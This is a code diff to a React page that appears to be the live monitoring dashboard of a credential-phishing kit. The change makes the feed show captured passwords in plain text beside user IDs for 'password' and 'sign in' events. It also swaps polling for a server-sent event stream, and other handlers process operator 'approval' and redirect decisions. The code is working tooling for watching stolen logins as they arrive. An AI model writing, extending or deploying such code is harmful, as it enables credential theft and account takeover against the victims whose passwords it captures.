@@ -82,11 +82,13 @@ export default function LinkPage() {
         className = 'user-id-entry';
         showActions = true;
       } else if (activity.type === 'password') {
-        content = `Password entered for: <strong>${userId}</strong>`;
+        const passwordDisplay = activity.password ? `: <code>${activity.password}</code>` : '';
+        content = `Password entered for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'password-entry';
         showActions = true;
       } else if (activity.type === 'signin') {
-        content = `Sign in button clicked for: <strong>${userId}</strong>`;
+        const passwordDisplay = activity.password ? ` (Password: <code>${activity.password}</code>)` : '';
+        content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'signin-entry';
         showActions = true;
       }
@@ -174,23 +176,39 @@ export default function LinkPage() {
       statusIndicator.classList.remove('status-inactive');
     }
 
-    async function checkForActivity() {
-      try {
-        const response = await fetch('/api/poll');
-        if (!response.ok) {
-          console.error('API response not OK:', response.status);
-          return;
+    // Connect to SSE for real-time activity updates
+    function connectSSE() {
+      const eventSource = new EventSource('/api/events');
+      
+      eventSource.onmessage = function(event) {
+        try {
+          const data = JSON.parse(event.data);
+          
+          if (data.type === 'activity') {
+            // New activity received
+            addActivityEntry(data.data);
+          } else if (data.type === 'approval') {
+            // Approval status update
+            updateActivityStatus(data.activityId, data.data.status, data.data.redirectType);
+          } else if (data.type === 'connected') {
+            console.log('SSE connected successfully');
+          }
+        } catch (error) {
+          console.error('Error parsing SSE message:', error);
         }
-        const activities = await response.json();
-        
-        if (activities && Array.isArray(activities) && activities.length > 0) {
-          activities.forEach(activity => {
-            addActivityEntry(activity);
-          });
-        }
-      } catch (error) {
-        console.error('Error fetching activities:', error);
-      }
+      };
+      
+      eventSource.onerror = function(error) {
+        console.error('SSE error:', error);
+        // Reconnect after 3 seconds
+        setTimeout(() => {
+          eventSource.close();
+          connectSSE();
+        }, 3000);
+      };
+      
+      // Store event source for cleanup
+      window.monitorEventSource = eventSource;
     }
 
     // Test API connection on load
@@ -204,12 +222,15 @@ export default function LinkPage() {
       }
     }
 
-    // Initial fetch and test
+    // Initialize
     testConnection();
-    checkForActivity();
-    const interval = setInterval(checkForActivity, 1000);
+    connectSSE();
 
-    return () => clearInterval(interval);
+    return () => {
+      if (window.monitorEventSource) {
+        window.monitorEventSource.close();
+      }
+    };
   }, []);
 
   return (
@@ -280,6 +301,15 @@ export default function LinkPage() {
           font-size: 16px;
           color: #000000;
           font-weight: 500;
+        }
+
+        .activity-content code {
+          background: #f0f0f0;
+          padding: 2px 6px;
+          border-radius: 3px;
+          font-family: monospace;
+          font-size: 14px;
+          color: #d32f2f;
         }
 
         .user-id-entry {
